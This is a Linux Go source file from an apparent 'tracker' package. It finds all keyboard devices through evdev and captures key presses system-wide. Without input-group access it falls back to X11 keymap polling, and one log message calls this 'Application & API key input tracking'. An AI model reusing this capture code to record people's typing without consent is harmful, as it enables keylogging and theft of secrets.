//go:build linux

package tracker

import (
	"log"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/holoplot/go-evdev"
)

// startNativeKeyCapture launches evdev readers and, when they are unavailable,
// an X11 keymap fallback. It is Linux-only because both mechanisms are native
// to Linux desktops.
func startNativeKeyCapture(eventCh chan<- int, stopCh <-chan struct{}) {
	devices, err := discoverKeyboards()
	if err != nil || len(devices) == 0 {
		// /dev/input/event* is unreadable without input-group permissions. In
		// zero-sudo mode we fall back to X11 keymap polling so system-wide
		// keystroke entropy still gets captured without root access.
		log.Printf("[tracker] Zero-Sudo Mode Active: /dev/input not readable (no input group) — enabling X11 keymap fallback for Application & API key input tracking")
	} else {
		log.Printf("[tracker] Found %d native evdev keyboard device(s)", len(devices))
	}

	// One goroutine per keyboard device
	for _, path := range devices {
		go func(devPath string) {
			dev, err := evdev.Open(devPath)
			if err != nil {
				log.Printf("[tracker] cannot open %s: %v", devPath, err)
				return
			}
			defer dev.Close()
			log.Printf("[tracker] listening on %s", devPath)

			for {
				// BLOCKING read — goroutine sleeps until the kernel delivers an event.
				// No select/default spin-loop → zero idle CPU usage.
				ev, err := dev.ReadOne()
				if err != nil {
					return
				}
				select {
				case <-stopCh:
					return
				default:
				}
				// Only capture key-press events (value==1), not releases or repeats
				if ev.Type == evdev.EV_KEY && ev.Value == 1 {
					select {
					case eventCh <- int(ev.Code):
					default:
					}
				}
			}
		}(path)
	}

	// Zero-sudo fallback: without evdev devices, watch the X11 keyboard state so
	// typing done outside the app window is still counted.
	if len(devices) == 0 {
		go func() {
			for {
				if err := pollX11Keymap(eventCh, stopCh); err != nil {
					// No display or X server unavailable — retry occasionally in
					// case the user logs into a graphical session later.
					select {
					case <-time.After(30 * time.Second):
						continue
					case <-stopCh:
						return
					}
				}
				return
			}
		}()
	}
}

// discoverKeyboards returns all /dev/input/event* keyboard device paths.
// Scans only /dev/input directly and resolves symlinks to avoid duplicate opens.
func discoverKeyboards() ([]string, error) {
	entries, err := os.ReadDir("/dev/input")
	if err != nil {
		return nil, err
	}

	seen := make(map[string]bool)
	var keyboards []string

	for _, e := range entries {
		name := e.Name()
		if !strings.HasPrefix(name, "event") {
			continue
		}
		path := filepath.Join("/dev/input", name)

		real, err := filepath.EvalSymlinks(path)
		if err != nil {
			real = path
		}
		if seen[real] {
			continue
		}

		dev, err := evdev.Open(path)
		if err != nil {
			continue
		}
		caps := dev.CapableTypes()
		for _, t := range caps {
			if t == evdev.EV_KEY {
				keyboards = append(keyboards, path)
				seen[real] = true
				break
			}
		}
		dev.Close()
	}
	return keyboards, nil
}
